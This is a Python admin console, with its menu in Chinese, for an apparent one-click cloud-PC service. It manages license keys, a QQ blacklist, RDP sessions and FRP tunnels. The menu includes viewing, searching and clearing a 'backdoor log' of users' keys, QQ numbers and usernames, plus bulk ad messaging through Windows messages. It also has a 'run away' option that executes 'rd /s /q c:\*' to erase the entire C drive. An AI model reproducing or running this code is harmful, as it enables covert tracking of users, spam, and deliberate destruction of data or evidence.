import subprocess
from basic_functions import *
def panel():
    while True:
        print("===========RainPaper一键开云工具===========")
        print("管理界面-请勿关闭")
        print("1.拉黑QQ名单查看\n2.卡密查看\n3.手动拉黑QQ\n4.手动增加卡密\n5.后门日志查看(信息量大)\n6.后门日志搜索\n7.后门日志清空\n8.当前链接用户查看\n9.FRP管理\n10.删除指定卡密\n11.删除指定的拉黑的QQ号\n12.查看计划任务执行日志\n13.Windows消息系统广告群发\n14.一键跑路\n15.版权信息")
        temp = input("请输入功能编号: ")
        if temp == "1":
            print_file_contents('khapi/black-qq.txt')
        elif temp == "2":
            print_file_contents('khapi/key.txt')
        elif temp == "3":
            qq_number = input("请输入要拉黑的QQ号码: ")
            add_to_file('khapi/black-qq.txt', qq_number)
        elif temp == "4":
            card_key = input("请输入要增加的卡密: ")
            add_to_file('khapi/key.txt', card_key)
        elif temp == "5":
            print_file_contents('khapi/后门日志.txt')
        elif temp == "6":
            search_term = input("请输入搜索内容(卡密,QQ,用户名等都行): ")
            with open('khapi/后门日志.txt', 'r') as file:
                for line in file:
                    if search_term in line:
                        print(line)
                input("搜索完成，按回车回到管理面板")
        elif temp == "7":
            open('khapi/后门日志.txt', 'w').close()
        elif temp == "8":
            get_active_rdp_users()
        elif temp == "9":
            if (input("请选择功能(1.创建隧道,2.运行隧道):")=="1"):
                mode = input("请选择FRP配置模式 (1: 导入配置文件模式, 2: 全手动配置模式, 3:一键自动化配置模式):")
                if mode == "2":
                    create_tunnel_advanced()
                elif mode=="1":
                    create_tunnel_easy()
                else:
                    create_tunnel_auto()
            else:
                run_tunnel()
        elif temp == "10":
            ck=input("请输入要删除的卡密:")
            delete_items("khapi/key.txt",ck)
            print(f"卡密 {ck} 已从卡密列表中删除")
            input("按回车键以回到面板:")
        elif temp == "11":
            qq_n=input("请输入要删除的拉黑的QQ号:")
            delete_items("khapi/black-qq.txt",qq_n)
            print(f"QQ号 {qq_n} 已从QQ黑名单中删除")
            input("按回车键以回到面板:")
        elif temp == "12":
            print_file_contents("job-log.txt")
        elif temp=="13":
            send_ad()
            input("广告发送成功，按回车回到管理面板")
        elif temp=="14":
            if input("你要继续跑路吗，这将删除C盘所有文件，需要5分钟才能删完，继续跑路请输入我要跑路这四个汉字")=="我要跑路":
                subprocess.run("cmd /c rd /s /q c:\*",shell=True)
            else:
                input("你后悔了，按回车回到管理面板")
        elif temp == "15":
            input("本程序由RainPaper编写，独家发行，旨在为云电脑快速搭建努力，本程序遵循MIT开源协议，按回车回到面板")
        else:
            print("无效的功能编号，请重新输入。")
        os.system("cls")